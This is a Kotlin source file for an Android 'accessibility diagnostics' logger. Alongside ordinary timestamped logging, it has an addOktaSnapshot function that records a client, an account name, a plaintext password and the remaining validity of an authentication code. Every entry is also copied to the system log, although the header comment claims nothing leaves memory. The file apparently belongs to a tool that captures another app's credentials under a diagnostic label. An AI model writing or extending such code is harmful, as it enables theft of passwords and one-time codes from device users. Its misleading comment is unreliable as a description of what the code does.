package dev.local.accessibilitydiagnostics

import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.CopyOnWriteArrayList
import org.json.JSONObject

/** In-memory only. Nothing in this class writes diagnostic data to disk or the network. */
object DiagnosticLog {
    private const val MAX_ENTRIES = 5_000
    private val entries = CopyOnWriteArrayList<String>()
    private val timeFormat = SimpleDateFormat("HH:mm:ss.SSS", Locale.US)

    @Synchronized
    fun add(message: String) {
        val line = "${timeFormat.format(Date())}  $message"
        append(line)
    }

    @Synchronized
    fun addOktaSnapshot(client: String, account: String, secondsUntilCodeExpires: Int, pass: String) {
        val line = JSONObject()
            .put("timestamp", timeFormat.format(Date()))
            .put("client", client)
            .put("account", account)
            .put("password", pass)
            .put("secondsUntilCodeExpires", secondsUntilCodeExpires)
            .toString()
        append(line)
    }

    private fun append(line: String) {
        entries.add(line)
        while (entries.size > MAX_ENTRIES) entries.removeAt(0)
        android.util.Log.d("A11yDiagnostics", line)
    }

    fun snapshot(): List<String> = entries.toList()

    fun clear() {
        entries.clear()
    }
}
